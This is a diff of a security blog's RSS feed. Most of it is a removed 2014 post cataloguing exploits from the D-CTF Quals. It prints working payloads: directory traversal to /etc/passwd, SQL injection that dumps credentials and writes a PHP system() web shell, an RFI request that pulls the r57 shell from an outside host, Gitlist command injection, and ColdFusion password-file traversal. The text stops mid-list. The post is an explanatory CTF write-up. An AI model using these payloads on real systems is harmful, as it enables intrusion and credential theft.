+&lt;p&gt;In conclusion, the combination of using hidden classes to access properties with inline caching and machine code generation optimizes for cases where the same type of object is frequently created and accessed in a similar way. This greatly improves the speed at which most JavaScript code can be executed.&lt;/p&gt;
+&lt;h3&gt;V8's Efficient Garbage Collecting&lt;/h3&gt;
+&lt;p&gt;In V8, a &lt;strong&gt;precise garbage collection&lt;/strong&gt; is used. &lt;em&gt;Every pointer's location are known on the execution stack&lt;/em&gt;, so it can implement incremental garbage collection. V8 can migrate an object to another place and just rewire the pointer.&lt;/p&gt;
+&lt;p&gt;In summary, V8's garbage collection:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="n"&gt;stops&lt;/span&gt; &lt;span class="n"&gt;program&lt;/span&gt; &lt;span class="n"&gt;execution&lt;/span&gt; &lt;span class="n"&gt;when&lt;/span&gt; &lt;span class="n"&gt;performing&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;garbage&lt;/span&gt; &lt;span class="n"&gt;collection&lt;/span&gt; &lt;span class="n"&gt;cycle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+
+&lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="n"&gt;processes&lt;/span&gt; &lt;span class="n"&gt;only&lt;/span&gt; &lt;span class="n"&gt;part&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt; &lt;span class="n"&gt;heap&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;most&lt;/span&gt; &lt;span class="n"&gt;collection&lt;/span&gt; &lt;span class="n"&gt;cycles&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;minimizing&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;impact&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;stopping&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+
+&lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="n"&gt;always&lt;/span&gt; &lt;span class="n"&gt;knows&lt;/span&gt; &lt;span class="n"&gt;exactly&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="n"&gt;all&lt;/span&gt; &lt;span class="n"&gt;objects&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;pointers&lt;/span&gt; &lt;span class="n"&gt;are&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;memory&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;avoiding&lt;/span&gt; &lt;span class="n"&gt;falsely&lt;/span&gt; &lt;span class="n"&gt;identifying&lt;/span&gt; &lt;span class="n"&gt;objects&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="n"&gt;pointers&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;hr /&gt;
+&lt;p&gt;&lt;strong&gt;tl;dr&lt;/strong&gt;: Google Chrome came with &lt;a href="http://blogoscoped.com/google-chrome/"&gt;pretty awesome stuff&lt;/a&gt;.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3</dc:creator><pubDate>Sat, 01 Nov 2014 04:20:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-11-01:a-closer-look-at-chromes-security-i-understanding-v8.html</guid><category>V8</category><category>JIT</category><category>JavaScript</category><category>garbage_collection</category><category>cache</category><category>bytecode</category></item><item><title>A List of Common Web Vulnerabilities</title><link>http://bt3gl.github.io/a-list-of-common-web-vulnerabilities.html</link><description>&lt;p&gt;Although nomenclatures don't help  much when you facing a security problem, I am keeping this list here for some useful organization. It is constantly been updated.&lt;/p&gt;
 &lt;h2&gt;Vulnerabilities to Web Applications&lt;/h2&gt;
 &lt;h3&gt;Cross-site Scripting (XSS)&lt;/h3&gt;
 &lt;p&gt;HTML has five characters that are reserved: angle brackets, single and double quotes, and ampersand. The ampersand should never appear in most HTML sections. Both angle brackets shouldn't be used inside a tag, unless  properly quoted. Quote characters inside a tag can also be harmless in text. To allow these characters to appear in problematic locations, an encoding based in an ampersand-prefixed and a semicolon-terminated scheme is used: the &lt;a href="http://www.w3schools.com/html/html_entities.asp"&gt;Entity Encoding&lt;/a&gt;.&lt;/p&gt;
@@ -523,232 +641,4 @@ flag&lt;span class="o"&gt;{&lt;/span&gt;FreeBoozeForEverone-Party!&lt;span class
 
 
 &lt;hr /&gt;
-&lt;p&gt;&lt;strong&gt;That's it! Hack all the things!&lt;/strong&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3</dc:creator><pubDate>Thu, 23 Oct 2014 06:30:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-10-23:the-peace-pipe-at-hacklus-final-ctf-2014.html</guid><category>SSH</category></item><item><title>Exploring D-CTF Quals 2014's Exploits</title><link>http://bt3gl.github.io/exploring-d-ctf-quals-2014s-exploits.html</link><description>&lt;p&gt;Last weekend I played some of the &lt;a href="http://dctf.defcamp.ro/challs"&gt;DEFCAMP CTF Quals&lt;/a&gt;. It was pretty intense. For (my own)  organizational purposes, I made a list of all the technologies and vulnerabilities  found in this CTF, some based on my team's game, some based on the &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/"&gt;CTF write-ups git repo&lt;/a&gt;.&lt;/p&gt;
-&lt;h2&gt;Vulnerabilities&lt;/h2&gt;
-&lt;h3&gt;Remote File Inclusion and Local File Inclusion Vulnerabilities&lt;/h3&gt;
-&lt;p&gt;In &lt;a href="http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion"&gt;Remote File Inclusion&lt;/a&gt; (RFI) an attacker can load exploits to the server. An attacker can use RFI to run exploits in both server and client sides. PHP's &lt;a href="http://php.net/manual/en/function.include.php"&gt;include()&lt;/a&gt; is extremely vulnerable to RFI attacks.&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion"&gt;Local File Inclusion&lt;/a&gt; (LFI) is similar to RFI but only files that are currently in the server can be included.  This type of vulnerability is seem in forms for file uploading (with improper sanitation).&lt;/p&gt;
-&lt;p&gt;An example of RFI exploitation is the case where the form only accepts some type of extensions (such as JPG or PNG) but the verification is made in the client side. In this case, an attacker can tamper the HTTP requests to send shell code (with PHP extension, for example). I've shown examples of this attack in the  &lt;a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html"&gt;Natas post&lt;/a&gt;. There  I've explained that the trick was to rename a PHP shell code to one of these safe extensions.&lt;/p&gt;
-&lt;h3&gt;TimThumb and LFI&lt;/h3&gt;
-&lt;p&gt;&lt;a href="https://code.google.com/p/timthumb/"&gt;TimThumb&lt;/a&gt; is a PHP script for manipulating web images. It was recently &lt;a href="http://www.binarymoon.co.uk/2014/09/timthumb-end-life/"&gt;discontinued because of security issues&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;With TimThumb 1.33, an attacker is able to upload a shell by appending it to an image. All  she needs to do is to have it in some online subdomain. TimThumb will store this image in a cache folder and generate a MD5 of the full path of the shell. The last step is to perform a LFI attack with the shell in this folder. Check this &lt;a href="http://kaoticcreations.blogspot.com/2011/12/lfi-tip-how-to-read-source-code-using.html"&gt;example of LFI exploitation&lt;/a&gt;.&lt;/p&gt;
-&lt;h3&gt;CMS Mini and RFI&lt;/h3&gt;
-&lt;p&gt;&lt;a href="http://www.mini-print.com/"&gt;CMS Mini&lt;/a&gt; is file system to build simple websites. It has &lt;a href="http://www.exploit-db.com/exploits/33030/"&gt;several vulnerabilities&lt;/a&gt; such as &lt;a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)"&gt;CSRF&lt;/a&gt;, RFI, and &lt;a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)"&gt;XSS&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;An example of RFI vulnerability in CMS Mini is explored using curl:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;http://&lt;/span&gt;
-&lt;span class="err"&gt;[target/IP]/cmsmini/admin/edit.php?path=&amp;amp;name=../../../../../etc/passwd&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;For more examples of exploits, check &lt;a href="http://en.1337day.com/exploit/22391"&gt;1337day&lt;/a&gt; and &lt;a href="http://www.exploit-db.com/exploits/28128/"&gt;this exploit-db&lt;/a&gt;.&lt;/p&gt;
-&lt;h3&gt;ApPHP and Remote Code Execution&lt;/h3&gt;
-&lt;p&gt;&lt;a href="http://www.apphp.com/"&gt;ApPHP&lt;/a&gt; is a blog script. It is known for having  &lt;a href="http://www.exploit-db.com/exploits/33030/"&gt;several vulnerabilities&lt;/a&gt;, including &lt;a href="https://www.owasp.org/index.php/PHP_Top_5#P1:_Remote_Code_Execution"&gt;remote code execution&lt;/a&gt; (RCE). An example of RCE exploit for ApPHP &lt;a href="http://www.exploit-db.com/exploits/33070/"&gt;can be seen here&lt;/a&gt;. A good start is to check the PHP's &lt;a href="http://php.net/manual/en/ini.core.php#ini.disable-functions"&gt;disable_function&lt;/a&gt; list for stuff to hacker the server.&lt;/p&gt;
-&lt;p&gt;In this CTF, the challenge was to find what was not in that list. For instance, it was possible to use &lt;a href="http://php.net/manual/en/reserved.variables.post.php"&gt;$_POST&lt;/a&gt; and &lt;a href="http://php.net/manual/en/reserved.variables.cookies.php"&gt;$_COOKIE&lt;/a&gt; to send strings to functions such as &lt;a href="http://php.net/manual/en/function.scandir.php"&gt;scandir()&lt;/a&gt; and &lt;a href="http://php.net/manual/en/function.file-get-contents.php"&gt;get_file_contents()&lt;/a&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;GET Request: ?asdf);print_r(scandir(implode($_COOKIE))=/&lt;/span&gt;
-&lt;span class="err"&gt;Cookie: 0=include&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;In addition, with a writable directory we can drop a shell in the server (you can use script-kiddies scripts like &lt;a href="http://www.r57shell.net/"&gt;r57 shell.net&lt;/a&gt;, but in real life, keep in mind that they are super uber &lt;a href="http://thehackerblog.com/hacking-script-kiddies-r57-gen-tr-shells-are-backdoored-in-a-way-you-probably-wouldnt-guess/#more-447"&gt;backdoored&lt;/a&gt;).&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;Post Request: 0=include/myfile.php&lt;/span&gt;
-&lt;span class="err"&gt;Cookie: 0=http://www.r57shell.net/shell/r57.txt&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h3&gt;Gitlist and Remote Command Execution&lt;/h3&gt;
-&lt;p&gt;&lt;a href="http://gitlist.org/"&gt;Gitlist&lt;/a&gt; is an application to browse github repositories in a browser. The  versions up to 5.0 are known for &lt;a href="http://www.websecuritywatch.com/arbitrary-command-execution-in-gitlist/"&gt;allowing remote attackers to execute arbitrary commands via shell&lt;/a&gt;, a type of &lt;a href="http://cwe.mitre.org/data/definitions/77.html"&gt;command injection&lt;/a&gt;. Exploits for this vulnerability can be seen at &lt;a href="http://hatriot.github.io/blog/2014/06/29/gitlist-rce/"&gt;hatriot&lt;/a&gt;, at &lt;a href="http://packetstormsecurity.com/files/127364/Gitlist-Unauthenticated-Remote-Command-Execution.html"&gt;packet storm&lt;/a&gt;, at &lt;a href="http://en.1337day.com/exploit/22391"&gt;1337day&lt;/a&gt;, and at &lt;a href="http://www.exploit-db.com/exploits/33990/"&gt;exploit-db&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;In this CTF, the following command could be used to look for the flag:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;http://10.13.37.33/gitlist/redis/blame/unstable/README%22%22%60ls%20-al%60&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h3&gt;LibreOffice's Socket Connections&lt;/h3&gt;
-&lt;p&gt;LibreOffice's has a binary &lt;a href="http://www.processlibrary.com/en/directory/files/soffice/66728/"&gt;soffice.bin&lt;/a&gt; that takes socket connections on the &lt;em&gt;port 2002&lt;/em&gt; (in this CTF, in the VPN's localhost).&lt;/p&gt;
-&lt;p&gt;For instance, the  command &lt;a href="http://linux.die.net/man/1/unoconv"&gt;unoconv&lt;/a&gt; can be used  to convert a file to a LibreOffice supported format. The flag &lt;strong&gt;-c&lt;/strong&gt; opens a connection by the client to connect to an LibreOffice instance. It also can be used by the listener to make LibreOffice listen.&lt;/p&gt;
-&lt;p&gt;From the documentation, the default connection string is:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;Default connection string is &amp;quot;socket,host=localhost,port=2002;urp;StarOffice.ComponentContext&amp;quot;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Therefore, you can connect to the socket and convert some document (such as &lt;em&gt;/flag.txt&lt;/em&gt;) to a PDF for example:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unoconv --connection &lt;span class="s1"&gt;&amp;#39;socket,host=127.0.0.1,port=2002;urp;StarOffice.ComponentContext&amp;#39;&lt;/span&gt; -f pdf /flag.txt
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;An example of payload can be seen &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/web-400"&gt;here&lt;/a&gt;.&lt;/p&gt;
-&lt;h3&gt;ColdFusion and Local File Disclosure&lt;/h3&gt;
-&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/Adobe_ColdFusion"&gt;ColdFusion&lt;/a&gt; is an old web application development platform. It carries its own (interpreted) language, &lt;strong&gt;CFM&lt;/strong&gt;, with a Java backend.&lt;/p&gt;
-&lt;p&gt;CFM has scripting features like ASP and PHP, and syntax resembling HTML and JavaScript.  ColdFusion scripts  have &lt;strong&gt;cfm&lt;/strong&gt; and &lt;strong&gt;cfc&lt;/strong&gt; file extension. For instance,  &lt;a href="http://www.adobe.com/products/coldfusion-family.html"&gt;Adobe ColdFusion 11&lt;/a&gt; and &lt;a href="http://www.getrailo.org/"&gt;Railio 4.2&lt;/a&gt;, the two platform accepting CFM,  were both released in the beginning of 2014.&lt;/p&gt;
-&lt;p&gt;The problem is that CFM is &lt;a href="http://www.intelligentexploit.com/view-details.html?id=12750"&gt;vulnerable to a variety of attacks&lt;/a&gt;, including &lt;a href="https://www.owasp.org/index.php/Full_Path_Disclosure"&gt;Local File Disclosure&lt;/a&gt; (LFD) and SQL injection (SQLi). Adding this to the fact that ColdFusion scripts  usually run on elevated privileged users, we have a very vulnerable platform.&lt;/p&gt;
-&lt;h4&gt;SQL Injection (SQLi)&lt;/h4&gt;
-&lt;p&gt;&lt;a href="https://www.owasp.org/index.php/SQL_Injection"&gt;SQL Injection&lt;/a&gt; is a classic attack where one injects exploits in a &lt;a href="http://technet.microsoft.com/en-us/library/bb264565(v=sql.90).aspx"&gt;SQL query&lt;/a&gt;. Vulnerabilities of this type can be spot in queries such as &lt;strong&gt;index.php?id=1&lt;/strong&gt;. I showed some of these exploits in my &lt;a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html"&gt;Natas post&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;In this CTF, these were  some of the  exploits that could be used:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;List everything  in a database, where &lt;strong&gt;0x3a&lt;/strong&gt; is the hexadecimal symbol for &lt;strong&gt;:&lt;/strong&gt;:&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;cms&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;ul&gt;
-&lt;li&gt;See the password file content:&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;LOAD_FILE&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;ul&gt;
-&lt;li&gt;Write files and create a PHP shell into &lt;strong&gt;URL/shell.php&lt;/strong&gt;, we can use a parameter &lt;strong&gt;x&lt;/strong&gt; to takes a parameter to be executed (based on &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/web-400"&gt;this&lt;/a&gt;):&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;UNION&lt;/span&gt; &lt;span class="nt"&gt;ALL&lt;/span&gt; &lt;span class="nt"&gt;SELECT&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;?php header(&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;text&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;plain&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;utf-8&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;); echo system($-GET&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt;); ?&amp;gt;&amp;#39;,3 INTO OUTFILE &amp;#39;/var/www/html/shell.php&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;--&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Notice the &lt;em&gt;trailing pair of hyphens&lt;/em&gt; &lt;strong&gt;--&lt;/strong&gt; which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed (it removes the trailing single-quote left over from the modified query). To learn more about how to mitigate SQLi, I recommend &lt;a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet"&gt;OWASP's SQLi Prevention Cheat Sheet&lt;/a&gt; and &lt;a href="http://owtf.github.io/boilerplate-templates/SQLinjection.html"&gt;this nice guide for SQLi mitigation&lt;/a&gt; by OWSAP OWTF.&lt;/p&gt;
-&lt;p&gt;By the way, it's useful in general to know &lt;a href="http://www.w3schools.com/tags/ref_urlencode.asp"&gt;HTML URL Encoding&lt;/a&gt; to craft these URLs.&lt;/p&gt;
-&lt;h3&gt;CesarFTP 0.99g and Buffer Overflow&lt;/h3&gt;
-&lt;p&gt;&lt;a href="http://www.softpedia.com/get/Internet/Servers/FTP-Servers/Cesar-FTP.shtml"&gt;CesarFTP 0.99g&lt;/a&gt; is an easy-to-use  FTP server. It is also known for having several vulnerabities, including &lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2961"&gt;buffer overflow&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;For example, see this exploit for &lt;strong&gt;Metasploit&lt;/strong&gt; from &lt;a href="http://www.exploit-db.com/exploits/16713/"&gt;exploit-db&lt;/a&gt; (or &lt;a href="http://www.exploit-db.com/exploits/1906/"&gt;an older one here&lt;/a&gt;).&lt;/p&gt;
-&lt;h4&gt;File Disclosure of Password Hashes&lt;/h4&gt;
-&lt;p&gt;This vulnerability provides a 30 second window in the Administration panel, which can e use to write a shell code. The main idea is a &lt;a href="https://www.owasp.org/index.php/Path_Traversal"&gt;directory traversal&lt;/a&gt; to the &lt;strong&gt;password.proprieties&lt;/strong&gt; that can be used to login in the server.&lt;/p&gt;
-&lt;p&gt;Ingredients of this attack are:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;The target must have ColdFusion administrator available, which is by default mapped to &lt;strong&gt;&lt;em&gt;CFIDE/administrator/enter.cfm&lt;/em&gt;&lt;/strong&gt;. If it gets &lt;a href="http://en.wikipedia.org/wiki/List_of_HTTP_status_codes"&gt;500&lt;/a&gt;, it should be switched to HTTPS.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;At the ColdFusion administrator, verify the version, and then use these injections:&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en&lt;/span&gt;
-
-&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en&lt;/span&gt;
-
-&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en&lt;/span&gt;
-
-&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;All&lt;/span&gt; &lt;span class="n"&gt;versions&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;ul&gt;
-&lt;li&gt;Now a shell can be written to a file and added in &lt;strong&gt;Schedule New Task&lt;/strong&gt;. See detailed instructions at &lt;a href="http://www.blackhatlibrary.net/Coldfusion_hacking"&gt;blackhatlib&lt;/a&gt;, at &lt;a href="http://www.infointox.net/?p=59"&gt;infointox&lt;/a&gt;, at &lt;a href="http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/"&gt;gnucitizen&lt;/a&gt;, at &lt;a href="http://kaoticcreations.blogspot.com/2012/11/hacking-cold-fusion-servers-part-i.html"&gt;kaoticcreations&lt;/a&gt;, at &lt;a href="https://www.cyberguerrilla.org/blog/?p=18275"&gt;cyberguerilla&lt;/a&gt;, at &lt;a href="http://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html"&gt;jumpespjump&lt;/a&gt;, and at &lt;a href="http://hexale.blogspot.com/2008/07/how-to-decrypt-coldfusion-datasource.html"&gt;hexale&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr /&gt;
-&lt;h2&gt;Useful Tools&lt;/h2&gt;
-&lt;h3&gt;Vulnerability Scanners&lt;/h3&gt;
-&lt;p&gt;Vulnerability scanners can be useful for several problems. For instance, for a PHP static source code analyser, we can use &lt;a href="http://rips-scanner.sourceforge.net/"&gt;RIPS&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;In this CTF we had to scan for &lt;a href="http://en.wikipedia.org/wiki/Heartbleed"&gt;Heartbleed&lt;/a&gt;, and we used &lt;a href="https://gist.githubusercontent.com/eelsivart/10174134/raw/5c4306a11fadeba9d9f9385cdda689754ca4d362/heartbleed.py"&gt;this script&lt;/a&gt;.&lt;/p&gt;
-&lt;h3&gt;Scapy&lt;/h3&gt;
-&lt;p&gt;&lt;a href="http://packetlife.net/blog/2011/may/23/introduction-scapy/"&gt;Scapy&lt;/a&gt; is a Python lib for crafting packets. It can be useful for problems such as &lt;a href="http://en.wikipedia.org/wiki/Port_knocking"&gt;port knocking&lt;/a&gt;. For illustration, check this &lt;a href="http://eindbazen.net/2011/12/phd-ctf-quals-2011-%E2%80%93-port-knocking/"&gt;example from PHD CTF 2011&lt;/a&gt; and this from &lt;a href="http://blog.dul.ac/2014/05/ASISCTF14/"&gt;ASIS CTF 2014&lt;/a&gt;. Check &lt;a href="https://code.google.com/p/pypk/source/browse/branches/release-0.1.0/knocker.py?r=3"&gt;this project&lt;/a&gt; too.&lt;/p&gt;
-&lt;h3&gt;Steganography&lt;/h3&gt;
-&lt;p&gt;One of the questions had a reference to the &lt;a href="https://ccrma.stanford.edu/~eberdahl/Projects/Paranoia/"&gt;paranoia.jar&lt;/a&gt; tool, which hides text in an image file using &lt;a href="http://en.wikipedia.org/wiki/Advanced_Encryption_Standard"&gt;128 bit AES&lt;/a&gt; encryption.&lt;/p&gt;
-&lt;p&gt;To run the tool (after downloading it) just do:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;java -jar paranoia.jar
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h3&gt;HTTP/HTTPS Request Tampering&lt;/h3&gt;
-&lt;p&gt;Very useful for the RFI problems (but not limited to them):&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/tamper-data/"&gt;Tamper Data&lt;/a&gt;: view and modify HTTP/HTTPS headers.&lt;/li&gt;
-&lt;li&gt;&lt;a href="http://portswigger.net/burp/"&gt;Burp&lt;/a&gt;: a Java application to secure or penetrate web applications.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3&gt;Wireshark&lt;/h3&gt;
-&lt;p&gt;At some point I'm going to dedicate an entire post for &lt;a href="https://www.wireshark.org/"&gt;Wireshark&lt;/a&gt;, but for this CTF the important things to know were:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Look for POST requests:&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;ul&gt;
-&lt;li&gt;Submit the found data (same username, nonce, and password) with the command:&lt;/li&gt;
-&lt;/ul&gt;
